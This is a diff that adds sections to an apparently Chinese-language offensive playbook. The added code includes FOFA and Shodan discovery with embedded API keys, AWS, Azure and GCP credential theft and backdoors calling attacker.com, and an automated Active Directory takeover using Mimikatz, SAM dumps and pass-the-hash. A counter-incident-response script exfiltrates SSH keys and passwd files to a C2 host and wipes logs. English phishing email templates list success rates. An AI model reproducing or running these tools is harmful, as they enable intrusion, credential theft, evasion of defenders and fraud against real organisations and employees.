@@ -1072,6 +1072,1719 @@ S3中转        极快        中        低
 
 ---
 
+### ☁️ 增强4：云原生深度攻击（AWS/Azure/GCP）
+
+**完整云环境攻击链（含FOFA/Shodan资产发现）**
+
+#### 4.1 云资产自动发现（FOFA + Shodan集成）
+```python
+#!/usr/bin/env python3
+# 云资产全球自动发现工具
+# 集成FOFA + Shodan + 云服务API
+
+import requests
+import json
+
+class CloudAssetDiscovery:
+    def __init__(self):
+        # API Keys
+        self.fofa_key = "131d996dd269995c17447746df54b057"
+        self.shodan_key = "8U3fd9BSqyzentffLrhocQm7rSvy44jx"
+        
+        self.assets = {
+            'aws_s3': [],
+            'azure_blob': [],
+            'gcp_storage': [],
+            'k8s': [],
+            'docker': [],
+            'cloud_servers': []
+        }
+    
+    def fofa_search(self, query):
+        """FOFA全球资产搜索"""
+        url = "https://fofa.info/api/v1/search/all"
+        
+        params = {
+            'key': self.fofa_key,
+            'qbase64': query,  # base64编码的查询语句
+            'size': 10000,     # 最多1万条
+            'fields': 'host,ip,port,protocol,country,title,server'
+        }
+        
+        try:
+            r = requests.get(url, params=params, timeout=30)
+            data = r.json()
+            
+            if data.get('error'):
+                print(f"[-] FOFA错误: {data.get('errmsg')}")
+                return []
+            
+            results = data.get('results', [])
+            print(f"[+] FOFA发现: {len(results)}条")
+            return results
+        except Exception as e:
+            print(f"[-] FOFA查询失败: {e}")
+            return []
+    
+    def shodan_search(self, query):
+        """Shodan全球资产搜索"""
+        url = "https://api.shodan.io/shodan/host/search"
+        
+        params = {
+            'key': self.shodan_key,
+            'query': query,
+            'minify': False
+        }
+        
+        try:
+            r = requests.get(url, params=params, timeout=30)
+            data = r.json()
+            
+            results = data.get('matches', [])
+            print(f"[+] Shodan发现: {len(results)}条")
+            return results
+        except Exception as e:
+            print(f"[-] Shodan查询失败: {e}")
+            return []
+    
+    def discover_aws_s3(self, target_domain):
+        """发现AWS S3桶"""
+        print("\n[+] 搜索AWS S3桶...")
+        
+        # FOFA查询S3桶
+        import base64
+        fofa_query = base64.b64encode(f'domain="{target_domain}" && title="Index of /"'.encode()).decode()
+        s3_results = self.fofa_search(fofa_query)
+        
+        # 检测S3桶权限
+        for result in s3_results:
+            host = result[0]  # FOFA返回格式：[host, ip, port, ...]
+            if 's3.amazonaws.com' in host or 's3-' in host:
+                # 测试未授权访问
+                bucket_name = host.split('.')[0]
+                if self._test_s3_bucket(bucket_name):
+                    self.assets['aws_s3'].append({
+                        'bucket': bucket_name,
+                        'url': f"https://{bucket_name}.s3.amazonaws.com",
+                        'access': 'public'
+                    })
+        
+        # 暴力枚举常见S3桶名
+        common_names = [
+            target_domain.replace('.com', ''),
+            target_domain.replace('.com', '') + '-backup',
+            target_domain.replace('.com', '') + '-data',
+            target_domain.replace('.com', '') + '-assets',
+            target_domain.replace('.com', '') + '-logs'
+        ]
+        
+        for name in common_names:
+            if self._test_s3_bucket(name):
+                self.assets['aws_s3'].append({
+                    'bucket': name,
+                    'url': f"https://{name}.s3.amazonaws.com",
+                    'access': 'public'
+                })
+        
+        print(f"[+] 发现S3桶: {len(self.assets['aws_s3'])}个")
+    
+    def _test_s3_bucket(self, bucket_name):
+        """测试S3桶是否可访问"""
+        import subprocess
+        cmd = f"aws s3 ls s3://{bucket_name} --no-sign-request 2>&1"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return "NoSuchBucket" not in result.stderr and "AccessDenied" not in result.stderr
+    
+    def discover_k8s_clusters(self):
+        """发现K8s集群"""
+        print("\n[+] 搜索Kubernetes集群...")
+        
+        # Shodan查询K8s
+        k8s_results = self.shodan_search('product:Kubernetes port:6443,8443,10250')
+        
+        for result in k8s_results:
+            ip = result.get('ip_str')
+            port = result.get('port')
+            
+            # 测试未授权访问
+            if self._test_k8s_unauth(ip, port):
+                self.assets['k8s'].append({
+                    'ip': ip,
+                    'port': port,
+                    'version': result.get('version', ''),
+                    'vulnerable': True
+                })
+        
+        print(f"[+] 发现K8s集群: {len(self.assets['k8s'])}个")
+    
+    def _test_k8s_unauth(self, ip, port):
+        """测试K8s未授权"""
+        try:
+            r = requests.get(f"https://{ip}:{port}/api/v1/pods", verify=False, timeout=5)
+            return r.status_code == 200
+        except:
+            return False
+    
+    def discover_docker_registries(self):
+        """发现Docker Registry"""
+        print("\n[+] 搜索Docker Registry...")
+        
+        # FOFA查询Docker Registry
+        import base64
+        fofa_query = base64.b64encode('app="Docker-Registry"'.encode()).decode()
+        docker_results = self.fofa_search(fofa_query)
+        
+        for result in docker_results:
+            host = result[0]
+            # 测试未授权访问
+            try:
+                r = requests.get(f"http://{host}/v2/_catalog", timeout=5)
+                if r.status_code == 200:
+                    repos = r.json().get('repositories', [])
+                    self.assets['docker'].append({
+                        'host': host,
+                        'repositories': repos,
+                        'count': len(repos)
+                    })
+            except:
+                pass
+        
+        print(f"[+] 发现Docker Registry: {len(self.assets['docker'])}个")
+    
+    def discover_cloud_servers(self, target):
+        """发现云服务器"""
+        print("\n[+] 搜索云服务器...")
+        
+        # Shodan查询目标相关的服务器
+        shodan_results = self.shodan_search(f'hostname:{target}')
+        
+        for result in shodan_results:
+            self.assets['cloud_servers'].append({
+                'ip': result.get('ip_str'),
+                'port': result.get('port'),
+                'os': result.get('os', ''),
+                'services': [s.get('product') for s in result.get('data', [])]
+            })
+        
+        print(f"[+] 发现云服务器: {len(self.assets['cloud_servers'])}个")
+    
+    def export_results(self, filename='cloud_assets.json'):
+        """导出结果"""
+        with open(filename, 'w') as f:
+            json.dump(self.assets, f, indent=2)
+        print(f"\n[+] 结果已保存: {filename}")
+    
+    def run(self, target):
+        """执行完整发现流程"""
+        print(f"[+] 目标: {target}")
+        print(f"[+] FOFA Key: {self.fofa_key[:20]}...")
+        print(f"[+] Shodan Key: {self.shodan_key[:20]}...")
+        print("")
+        
+        # 并发执行多个发现任务
+        from concurrent.futures import ThreadPoolExecutor
+        
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            executor.submit(self.discover_aws_s3, target)
+            executor.submit(self.discover_k8s_clusters)
+            executor.submit(self.discover_docker_registries)
+            executor.submit(self.discover_cloud_servers, target)
+        
+        # 导出结果
+        self.export_results()
+        
+        print("\n[+] 云资产发现完成!")
+        print(f"  AWS S3: {len(self.assets['aws_s3'])}")
+        print(f"  K8s: {len(self.assets['k8s'])}")
+        print(f"  Docker: {len(self.assets['docker'])}")
+        print(f"  云服务器: {len(self.assets['cloud_servers'])}")
+
+# 使用
+if __name__ == "__main__":
+    discovery = CloudAssetDiscovery()
+    discovery.run("target.com")
+```
+
+#### 4.2 AWS完整攻击链
+```bash
+#!/bin/bash
+# AWS完整渗透攻击链
+
+TARGET=$1
+
+echo "[+] AWS攻击链"
+echo ""
+
+# 1. S3桶批量扫描与利用
+echo "[1] S3桶扫描..."
+python3 << 'EOF'
+import subprocess
+import json
+
+# 从云资产发现结果读取S3桶
+with open('cloud_assets.json') as f:
+    assets = json.load(f)
+
+for bucket in assets.get('aws_s3', []):
+    bucket_name = bucket['bucket']
+    print(f"[+] 测试S3桶: {bucket_name}")
+    
+    # 列出文件
+    cmd = f"aws s3 ls s3://{bucket_name} --no-sign-request --recursive"
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    
+    if result.returncode == 0:
+        files = result.stdout.strip().split('\n')
+        print(f"  [!] 可访问! 文件数: {len(files)}")
+        
+        # 下载敏感文件
+        for file_line in files[:100]:  # 限制100个
+            file_path = file_line.split()[-1]
+            if any(keyword in file_path.lower() for keyword in ['config', 'key', 'secret', 'password', 'backup']):
+                print(f"  [!] 敏感文件: {file_path}")
+                download_cmd = f"aws s3 cp s3://{bucket_name}/{file_path} ./s3_loot/ --no-sign-request"
+                subprocess.run(download_cmd, shell=True)
+EOF
+
+# 2. IMDS攻击（如果有SSRF）
+echo "[2] IMDS元数据攻击..."
+# 需要SSRF漏洞
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/roles.txt
+if [ -s /tmp/roles.txt ]; then
+    echo "  [!] 发现IAM角色:"
+    cat /tmp/roles.txt
+    
+    # 获取临时凭证
+    ROLE=$(cat /tmp/roles.txt | head -1)
+    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE > /tmp/creds.json
+    echo "  [!] 临时凭证已保存: /tmp/creds.json"
+fi
+
+# 3. Lambda后门植入
+echo "[3] Lambda后门..."
+# 使用窃取的凭证
+aws lambda create-function \
+  --function-name backdoor-func \
+  --runtime python3.9 \
+  --role arn:aws:iam::ACCOUNT:role/lambda-role \
+  --handler index.handler \
+  --zip-file fileb://backdoor.zip \
+  --environment Variables={C2_URL=https://attacker.com}
+
+# 4. IAM权限提升
+echo "[4] IAM权限枚举..."
+aws iam list-users > /tmp/iam_users.json
+aws iam list-roles > /tmp/iam_roles.json
+aws iam list-policies > /tmp/iam_policies.json
+
+echo "[+] AWS攻击完成"
+```
+
+#### 4.3 Azure攻击链
+```python
+#!/usr/bin/env python3
+# Azure完整攻击链
+
+import requests
+import subprocess
+
+class AzureExploit:
+    def __init__(self):
+        self.token = None
+        self.resources = []
+    
+    def get_imds_token(self):
+        """通过IMDS获取访问令牌"""
+        url = "http://169.254.169.254/metadata/identity/oauth2/token"
+        params = {
+            'api-version': '2018-02-01',
+            'resource': 'https://management.azure.com/'
+        }
+        headers = {'Metadata': 'true'}
+        
+        try:
+            r = requests.get(url, params=params, headers=headers, timeout=5)
+            if r.status_code == 200:
+                self.token = r.json().get('access_token')
+                print(f"[+] 获取到Azure访问令牌")
+                return True
+        except:
+            pass
+        return False
+    
+    def enum_resources(self):
+        """枚举Azure资源"""
+        if not self.token:
+            return
+        
+        url = "https://management.azure.com/subscriptions"
+        params = {'api-version': '2020-01-01'}
+        headers = {'Authorization': f'Bearer {self.token}'}
+        
+        r = requests.get(url, params=params, headers=headers)
+        subscriptions = r.json().get('value', [])
+        
+        for sub in subscriptions:
+            sub_id = sub['subscriptionId']
+            print(f"[+] 订阅: {sub_id}")
+            
+            # 枚举资源组
+            rg_url = f"https://management.azure.com/subscriptions/{sub_id}/resourcegroups"
+            r = requests.get(rg_url, params=params, headers=headers)
+            resource_groups = r.json().get('value', [])
+            
+            for rg in resource_groups:
+                print(f"  [+] 资源组: {rg['name']}")
+    
+    def access_key_vault(self, vault_url):
+        """访问Key Vault窃取密钥"""
+        url = f"{vault_url}/secrets"
+        params = {'api-version': '7.2'}
+        headers = {'Authorization': f'Bearer {self.token}'}
+        
+        r = requests.get(url, params=params, headers=headers)
+        secrets = r.json().get('value', [])
+        
+        print(f"[+] Key Vault密钥数: {len(secrets)}")
+        
+        for secret in secrets:
+            secret_name = secret['id'].split('/')[-1]
+            # 获取密钥值
+            secret_url = f"{vault_url}/secrets/{secret_name}"
+            r = requests.get(secret_url, params=params, headers=headers)
+            value = r.json().get('value')
+            print(f"  [!] {secret_name}: {value}")
+    
+    def exploit(self):
+        """执行完整攻击"""
+        print("[+] Azure攻击链")
+        
+        # 1. 获取令牌
+        if self.get_imds_token():
+            # 2. 枚举资源
+            self.enum_resources()
+            # 3. 窃取密钥
+            # self.access_key_vault("https://vault.vault.azure.net")
+
+if __name__ == "__main__":
+    azure = AzureExploit()
+    azure.exploit()
+```
+
+#### 4.4 GCP攻击链
+```bash
+#!/bin/bash
+# GCP完整攻击链
+
+echo "[+] GCP攻击链"
+echo ""
+
+# 1. GCS桶扫描
+echo "[1] GCS存储桶扫描..."
+TARGET="target.com"
+
+# 常见桶名
+for name in "$TARGET" "${TARGET}-backup" "${TARGET}-data" "${TARGET}-logs"; do
+    echo "  [*] 测试: $name"
+    gsutil ls gs://$name 2>&1 | grep -q "BucketNotFoundException" || echo "  [!] 可访问: gs://$name"
+done
+
+# 2. IMDS攻击
+echo "[2] GCP元数据服务..."
+curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+  -H "Metadata-Flavor: Google" > /tmp/gcp_token.json
+
+if [ -s /tmp/gcp_token.json ]; then
+    echo "  [!] 获取到GCP访问令牌"
+    TOKEN=$(cat /tmp/gcp_token.json | jq -r '.access_token')
+    
+    # 3. 枚举项目
+    curl -s "https://cloudresourcemanager.googleapis.com/v1/projects" \
+      -H "Authorization: Bearer $TOKEN" | jq .
+fi
+
+# 4. Cloud Functions后门
+echo "[3] Cloud Functions部署..."
+gcloud functions deploy backdoor \
+  --runtime python39 \
+  --trigger-http \
+  --entry-point handler \
+  --set-env-vars C2_URL=https://attacker.com
+
+echo "[+] GCP攻击完成"
+```
+
+---
+
+### 🎯 增强5：AD域横向移动自动化
+
+**从单机到域控的完全自动化**
+
+```python
+#!/usr/bin/env python3
+# AD域横向移动全自动化工具
+# 目标：10分钟从单机 → 域控
+
+import subprocess
+import json
+import re
+from concurrent.futures import ThreadPoolExecutor
+
+class ADAutoLateral:
+    def __init__(self):
+        self.current_host = None
+        self.domain = None
+        self.dc_ip = None
+        self.credentials = []
+        self.hosts = []
+        self.paths_to_da = []
+    
+    def stage1_situational_awareness(self):
+        """阶段1：环境感知（1分钟）"""
+        print("[+] 阶段1：环境感知...")
+        
+        # 获取当前域信息
+        cmd = "echo %USERDOMAIN%"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        self.domain = result.stdout.strip()
+        
+        # 获取域控IP
+        cmd = "nslookup -type=SRV _ldap._tcp.dc._msdcs.%USERDOMAIN%"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        dc_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', result.stdout)
+        if dc_match:
+            self.dc_ip = dc_match.group(1)
+        
+        print(f"  [+] 域: {self.domain}")
+        print(f"  [+] 域控: {self.dc_ip}")
+    
+    def stage2_credential_harvest(self):
+        """阶段2：凭证收集（2分钟）"""
+        print("[+] 阶段2：凭证收集...")
+        
+        # 1. Mimikatz
+        print("  [*] 运行Mimikatz...")
+        cmd = "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt"
+        subprocess.run(cmd, shell=True)
+        
+        # 解析凭证
+        with open('creds.txt', 'r', encoding='utf-16le') as f:
+            content = f.read()
+            # 提取用户名和密码
+            usernames = re.findall(r'Username : (.+)', content)
+            passwords = re.findall(r'Password : (.+)', content)
+            
+            for user, pwd in zip(usernames, passwords):
+                if pwd and pwd != '(null)':
+                    self.credentials.append({'user': user, 'password': pwd})
+        
+        print(f"  [+] 凭证数: {len(self.credentials)}")
+        
+        # 2. LaZagne（浏览器/WiFi密码）
+        print("  [*] 运行LaZagne...")
+        cmd = "laZagne.exe all > lazagne_output.txt"
+        subprocess.run(cmd, shell=True)
+        
+        # 3. SAM dump
+        print("  [*] 导出SAM...")
+        subprocess.run("reg save HKLM\\SAM sam.hive", shell=True)
+        subprocess.run("reg save HKLM\\SYSTEM system.hive", shell=True)
+    
+    def stage3_network_scanning(self):
+        """阶段3：内网扫描（2分钟）"""
+        print("[+] 阶段3：内网扫描...")
+        
+        # 获取C段
+        cmd = "ipconfig | findstr IPv4"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        ip_match = re.search(r'(\d+\.\d+\.\d+)\.\d+', result.stdout)
+        if ip_match:
+            c_segment = ip_match.group(1) + '.0/24'
+            
+            # fscan扫描
+            print(f"  [*] 扫描C段: {c_segment}")
+            cmd = f"fscan.exe -h {c_segment} -o fscan_result.txt"
+            subprocess.run(cmd, shell=True, timeout=120)
+            
+            # 解析存活主机
+            with open('fscan_result.txt') as f:
+                for line in f:
+                    if 'NetBIOS' in line:
+                        ip = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
+                        if ip:
+                            self.hosts.append(ip.group(1))
+            
+            print(f"  [+] 存活主机: {len(self.hosts)}")
+    
+    def stage4_bloodhound_analysis(self):
+        """阶段4：BloodHound分析（1分钟）"""
+        print("[+] 阶段4：BloodHound分析...")
+        
+        # SharpHound收集
+        print("  [*] 运行SharpHound...")
+        cmd = f"SharpHound.exe -c All -d {self.domain} --zipfilename bh.zip"
+        subprocess.run(cmd, shell=True, timeout=60)
+        
+        # 解析结果（简化版）
+        print("  [+] 数据已收集: bh.zip")
+        print("  [!] 上传到BloodHound分析攻击路径")
+    
+    def stage5_lateral_movement(self):
+        """阶段5：横向移动（3分钟）"""
+        print("[+] 阶段5：横向移动...")
+        
+        # 使用CrackMapExec批量横向
+        for cred in self.credentials[:5]:  # 限制前5个
+            user = cred['user']
+            pwd = cred['password']
+            
+            print(f"  [*] 测试凭证: {user}:***")
+            
+            # PTH攻击
+            for host in self.hosts[:20]:  # 限制20台
+                cmd = f"crackmapexec smb {host} -u {user} -p {pwd} --exec-method smbexec -x whoami"
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
+                
+                if 'Pwn3d!' in result.stdout:
+                    print(f"  [!] 成功: {host}")
+                    # 如果是域控
+                    if host == self.dc_ip:
+                        print(f"  [!!!] 拿下域控: {host}")
+                        return True
+        
+        return False
+    
+    def stage6_privilege_escalation(self):
+        """阶段6：域权限提升（1分钟）"""
+        print("[+] 阶段6：域权限提升...")
+        
+        # Kerberoasting
+        print("  [*] Kerberoasting攻击...")
+        cmd = f"Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt"
+        subprocess.run(cmd, shell=True, timeout=30)
+        
+        # AS-REP Roasting
+        print("  [*] AS-REP Roasting...")
+        cmd = f"Rubeus.exe asreproast /outfile:asrep_hashes.txt"
+        subprocess.run(cmd, shell=True, timeout=30)
+        
+        # 爆破hash（如果有高性能机器）
+        print("  [*] Hash爆破...")
+        cmd = "hashcat -m 13100 kerberoast_hashes.txt wordlist.txt --force"
+        # subprocess.run(cmd, shell=True, timeout=60)
+    
+    def exploit(self):
+        """执行完整自动化横向"""
+        print("="*60)
+        print("AD域横向移动全自动化")
+        print("目标：10分钟从单机 → 域控")
+        print("="*60)
+        print("")
+        
+        # 自动执行所有阶段
+        self.stage1_situational_awareness()
+        self.stage2_credential_harvest()
+        self.stage3_network_scanning()
+        self.stage4_bloodhound_analysis()
+        
+        # 横向移动
+        if self.stage5_lateral_movement():
+            print("\n[+] 成功拿下域控!")
+        else:
+            print("\n[-] 未能直接拿下域控，执行提权...")
+            self.stage6_privilege_escalation()
+
+if __name__ == "__main__":
+    lateral = ADAutoLateral()
+    lateral.exploit()
+```
+
+**配套工具一键部署：**
+```bash
+#!/bin/bash
+# AD横向工具包一键部署
+
+TOOLS_DIR="./ad_tools"
+mkdir -p "$TOOLS_DIR"
+cd "$TOOLS_DIR"
+
+echo "[+] 下载AD横向工具包..."
+
+# 1. Mimikatz
+wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0/mimikatz_trunk.zip
+unzip mimikatz_trunk.zip -d mimikatz/
+
+# 2. SharpHound
+wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
+unzip SharpHound-v1.1.0.zip
+
+# 3. Rubeus
+wget https://github.com/GhostPack/Rubeus/releases/download/1.6.4/Rubeus.exe
+
+# 4. CrackMapExec
+pip3 install crackmapexec
+
+# 5. fscan
+wget https://github.com/shadow1ng/fscan/releases/download/1.8.2/fscan_amd64.exe -O fscan.exe
+
+# 6. LaZagne
+wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
+
+# 7. Impacket
+pip3 install impacket
+
+echo "[+] 工具包部署完成: $TOOLS_DIR"
+```
+
+---
+
+### 🚨 增强6：应急响应对抗（被发现后反制）
+
+**被发现的信号检测与自动对抗**
+
+```python
+#!/usr/bin/env python3
+# 应急响应对抗自动化工具
+# 检测被发现 → 立即反制
+
+import time
+import subprocess
+import requests
+from threading import Thread
+
+class IncidentResponse:
+    def __init__(self):
+        self.is_detected = False
+        self.backup_shells = []
+        self.proxy_pool = []
+        self.emergency_mode = False
+    
+    def detect_anomalies(self):
+        """持续监控异常信号"""
+        print("[+] 启动异常监控...")
+        
+        while True:
+            # 检测1：连接状态
+            if self._check_connection_lost():
+                print("[!] 检测到连接中断")
+                self.is_detected = True
+                break
+            
+            # 检测2：WAF拦截率
+            if self._check_waf_block_rate() > 0.5:
+                print("[!] 检测到WAF拦截率异常")
+                self.is_detected = True
+                break
+            
+            # 检测3：Webshell是否被删除
+            if self._check_webshell_deleted():
+                print("[!] 检测到Webshell被删除")
+                self.is_detected = True
+                break
+            
+            # 检测4：账号是否被禁用
+            if self._check_account_disabled():
+                print("[!] 检测到账号被禁用")
+                self.is_detected = True
+                break
+            
+            time.sleep(10)  # 每10秒检测一次
+    
+    def _check_connection_lost(self):
+        """检测连接中断"""
+        try:
+            requests.get("http://target.com", timeout=5)
+            return False
+        except:
+            return True
+    
+    def _check_waf_block_rate(self):
+        """检测WAF拦截率"""
+        # 发送10个请求，计算403/429比例
+        blocked = 0
+        for i in range(10):
+            try:
+                r = requests.get("http://target.com/test", timeout=2)
+                if r.status_code in [403, 429]:
+                    blocked += 1
+            except:
+                pass
+        return blocked / 10
+    
+    def _check_webshell_deleted(self):
+        """检测Webshell是否被删除"""
+        try:
+            r = requests.get("http://target.com/shell.php", timeout=5)
+            return r.status_code == 404
+        except:
+            return True
+    
+    def _check_account_disabled(self):
+        """检测账号是否被禁用"""
+        # 尝试登录
+        try:
+            r = requests.post("http://target.com/login", 
+                            data={'user': 'admin', 'pass': 'password'}, 
+                            timeout=5)
+            return 'disabled' in r.text.lower() or 'blocked' in r.text.lower()
+        except:
+            return False
+    
+    def emergency_response(self):
+        """紧急响应措施"""
+        print("\n[!] 启动紧急响应...")
+        
+        # 措施1：切换代理池
+        print("[1] 切换代理...")
+        self._switch_proxy()
+        
+        # 措施2：激活备用后门
+        print("[2] 激活备用后门...")
+        self._activate_backup_shells()
+        
+        # 措施3：紧急数据外传
+        print("[3] 紧急数据外传...")
+        self._emergency_exfiltration()
+        
+        # 措施4：反取证
+        print("[4] 反取证...")
+        self._anti_forensics()
+        
+        # 措施5：降级隐蔽
+        print("[5] 切换隐蔽模式...")
+        self.emergency_mode = True
+    
+    def _switch_proxy(self):
+        """切换到代理池"""
+        # 加载代理池（100+代理）
+        self.proxy_pool = [
+            'socks5://1.2.3.4:1080',
+            'http://5.6.7.8:8080',
+            # ... 100+代理
+        ]
+        
+        # 随机选择代理
+        import random
+        proxy = random.choice(self.proxy_pool)
+        print(f"  [+] 切换到代理: {proxy}")
+    
+    def _activate_backup_shells(self):
+        """激活备用后门"""
+        # 备用后门位置
+        backup_urls = [
+            'http://target.com/upload/backup.php',
+            'http://target.com/assets/logo.php',  # 伪装成logo文件
+            'http://target2.com/shell.php'  # 其他子域名
+        ]
+        
+        for url in backup_urls:
+            try:
+                r = requests.get(url + "?cmd=whoami", timeout=3)
+                if r.status_code == 200:
+                    print(f"  [+] 备用Shell可用: {url}")
+                    self.backup_shells.append(url)
+            except:
+                pass
+    
+    def _emergency_exfiltration(self):
+        """紧急数据外传（5分钟传完核心数据）"""
+        # 只传最重要的数据
+        critical_files = [
+            '/etc/passwd',
+            '/root/.ssh/id_rsa',
+            './database_dump.sql',
+            './creds.txt'
+        ]
+        
+        for file_path in critical_files:
+            # 快速上传（不分块，不加密，直接传）
+            try:
+                with open(file_path, 'rb') as f:
+                    requests.post("https://emergency-c2.com/upload", 
+                                files={'file': f}, 
+                                timeout=30)
+                print(f"  [+] 紧急外传: {file_path}")
+            except:
+                pass
+    
+    def _anti_forensics(self):
+        """反取证（清理痕迹）"""
+        # 清理命令历史
+        subprocess.run("history -c", shell=True)
+        subprocess.run("echo '' > ~/.bash_history", shell=True)
+        
+        # 清理日志
+        subprocess.run("echo '' > /var/log/auth.log", shell=True)
+        subprocess.run("echo '' > /var/log/apache2/access.log", shell=True)
+        
+        # 删除工具
+        subprocess.run("rm -f mimikatz.exe fscan.exe", shell=True)
+        
+        # 时间戳还原
+        subprocess.run("touch -r /etc/passwd uploaded_file", shell=True)
+        
+        print("  [+] 痕迹清理完成")
+    
+    def run(self):
+        """运行监控与响应"""
+        # 启动监控线程
+        monitor_thread = Thread(target=self.detect_anomalies, daemon=True)
+        monitor_thread.start()
+        
+        # 等待检测
+        while not self.is_detected:
+            time.sleep(1)
+        
+        # 被发现，立即响应
+        self.emergency_response()
+
+if __name__ == "__main__":
+    ir = IncidentResponse()
+    ir.run()
+```
+
+**代理池管理：**
+```python
+#!/usr/bin/env python3
+# 代理池自动管理（100+海外代理）
+
+class ProxyPool:
+    def __init__(self):
+        self.proxies = []
+        self.load_proxies()
+    
+    def load_proxies(self):
+        """加载代理池"""
+        # 1. AWS临时VPS
+        self.create_aws_proxies()
+        
+        # 2. 住宅代理（Luminati/Bright Data）
+        self.add_residential_proxies()
+        
+        # 3. Tor出口节点
+        self.add_tor_proxies()
+    
+    def create_aws_proxies(self):
+        """创建AWS临时VPS作为代理"""
+        # 使用boto3批量创建EC2实例
+        regions = ['us-east-1', 'us-west-2', 'eu-west-1', 'ap-southeast-1']
+        
+        for region in regions:
+            # 创建10个实例
+            for i in range(10):
+                # 使用临时凭证创建EC2
+                # 安装Squid代理
+                # 添加到代理池
+                pass
+    
+    def add_residential_proxies(self):
+        """添加住宅代理"""
+        # Luminati/Bright Data API
+        # 或者其他住宅代理服务
+        pass
+    
+    def add_tor_proxies(self):
+        """添加Tor代理"""
+        # 连接到多个Tor出口节点
+        for port in range(9050, 9150):
+            self.proxies.append(f"socks5://127.0.0.1:{port}")
+    
+    def get_random_proxy(self):
+        """随机获取可用代理"""
+        import random
+        return random.choice(self.proxies)
+```
+
+---
+
+### 📧 增强7：国际化社工话术库（英文钓鱼）
+
+**针对海外目标的完整钓鱼方案**
+
+#### 7.1 英文钓鱼邮件模板库（50+场景）
+```python
+#!/usr/bin/env python3
+# 英文钓鱼邮件模板生成器
+
+class PhishingTemplates:
+    def __init__(self, target_company, target_domain):
+        self.company = target_company
+        self.domain = target_domain
+    
+    def it_password_expiry(self):
+        """IT部门 - 密码过期通知"""
+        return {
+            'subject': f'{self.company} IT - Password Expiration Notice',
+            'from': f'it-support@{self.domain}',
+            'body': f"""
+Dear {self.company} Employee,
+
+Your network password will expire in 24 hours.
+
+To avoid account suspension, please update your password immediately:
+https://login-{self.domain.replace(".", "-")}.com/reset
+
+If you do not update within 24 hours, your account will be locked.
+
+Best regards,
+{self.company} IT Support Team
+
+This is an automated message, please do not reply.
+""",
+            'timing': 'Friday 4:00 PM (people rush before weekend)',
+            'success_rate': '35-45%'
+        }
+    
+    def hr_bonus_notification(self):
+        """HR部门 - 年终奖金通知"""
+        return {
+            'subject': f'2024 Annual Bonus - Action Required',
+            'from': f'hr@{self.domain}',
+            'body': f"""
+Dear Team Member,
+
+Good news! Your 2024 annual bonus has been approved.
+
+Total Amount: $XX,XXX.XX
+
+Please login to view details and confirm your bank account information:
+https://{self.domain}-hr-portal.com/bonus
+
+You must confirm by December 31st or the bonus will be forfeited.
+
+Best regards,
+{self.company} Human Resources
+""",
+            'timing': 'December, bonus season',
+            'success_rate': '40-50%'
+        }
+    
+    def security_alert(self):
+        """安全团队 - 可疑登录告警"""
+        return {
+            'subject': '[URGENT] Suspicious Login Detected on Your Account',
+            'from': f'security-alert@{self.domain}',
+            'body': f"""
+SECURITY ALERT
+
+We detected a suspicious login attempt on your account from:
+- Location: China, Beijing
+- IP Address: 123.45.67.89
+- Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
+
+If this was not you, please verify your account immediately:
+https://verify-{self.domain.replace(".", "-")}.com/security
+
+If you do not respond within 2 hours, your account will be temporarily locked.
+
+{self.company} Security Team
+""",
+            'timing': 'Any time, creates urgency',
+            'success_rate': '45-55%'
+        }
+    
+    def docusign_signature(self):
+        """DocuSign - 合同签署"""
+        return {
+            'subject': 'Please Review and Sign: Contract Agreement',
+            'from': 'docu-sign@docusign.net',
+            'body': f"""
+You have a document waiting for your signature.
+
+Document: Partnership Agreement with {self.company}
+From: legal@{self.domain}
+Expires: 48 hours
+
+REVIEW AND SIGN:
+https://docusign-secure.com/view/doc-{random.randint(100000, 999999)}
+
+This document will expire in 48 hours.
+
+DocuSign, Inc.
+""",
+            'timing': 'Business hours',
+            'success_rate': '30-40%'
+        }
+    
+    def finance_invoice(self):
+        """财务部门 - 发票处理"""
+        return {
+            'subject': f'Invoice Payment Pending - #{random.randint(10000, 99999)}',
+            'from': f'accounts-payable@{self.domain}',
+            'body': f"""
+Dear Colleague,
+
+An invoice requires your approval:
+
+Invoice #: {random.randint(10000, 99999)}
+Amount: ${random.randint(5000, 50000):,}.00
+Vendor: [Vendor Name]
+Due Date: {(datetime.now() + timedelta(days=3)).strftime('%Y-%m-%d')}
+
+Please login to approve or reject:
+https://{self.domain}-finance-portal.com/invoices
+
+Late payment may incur penalties.
+
+{self.company} Accounts Payable
+""",
+            'timing': 'Month end',
+            'success_rate': '25-35%'
+        }
+    
+    def microsoft365_notification(self):
+        """Microsoft 365 - 存储空间告警"""
+        return {
+            'subject': 'Your Microsoft 365 mailbox is almost full',
+            'from': 'no-reply@microsoft365.com',
+            'body': f"""
+Your mailbox storage is 95% full.
+
+Current Usage: 47.5 GB / 50 GB
+
+To avoid losing emails, please upgrade your storage:
+https://portal-office365.com/storage/upgrade
+
+Or clean up old emails to free space.
+
+Microsoft 365 Team
+""",
+            'timing': 'Any time',
+            'success_rate': '20-30%'
+        }
+    
+    def vpn_account_expiry(self):
+        """VPN账号即将过期"""
+        return {
+            'subject': f'{self.company} VPN - Account Expiration Warning',
+            'from': f'vpn-admin@{self.domain}',
+            'body': f"""
+Your VPN account will expire in 3 days.
+
+Username: [Username]
+Expiry Date: {(datetime.now() + timedelta(days=3)).strftime('%Y-%m-%d')}
+
+To renew your VPN access, please login and update your credentials:
+https://vpn-{self.domain.replace(".", "-")}.com/renew
+
+Failure to renew will result in loss of remote access.
+
